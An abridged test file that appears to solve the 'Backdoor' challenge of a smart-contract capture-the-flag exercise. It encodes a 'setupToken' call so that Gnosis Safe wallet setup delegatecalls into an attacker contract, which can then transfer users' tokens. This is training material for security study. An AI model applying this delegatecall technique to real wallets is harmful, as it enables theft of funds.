...
describe("[Challenge] Backdoor", function () {
  ...
  it("Exploit", async function () {
    ...
    /**
     * The main idea here is to create a new module to exploit the gnosis wallet enabling our contract to transfer tokens by using delegatecalls
     */
    const backdoorAttacker = await (
    ...
    const moduleIFace = new ethers.utils.Interface(abi);
    const setupData = moduleIFace.encodeFunctionData("setupToken", [
      this.token.address,
      backdoorAttacker.address,
    ]);

    await backdoorAttacker.connect(attacker).attack(users, setupData);
  });
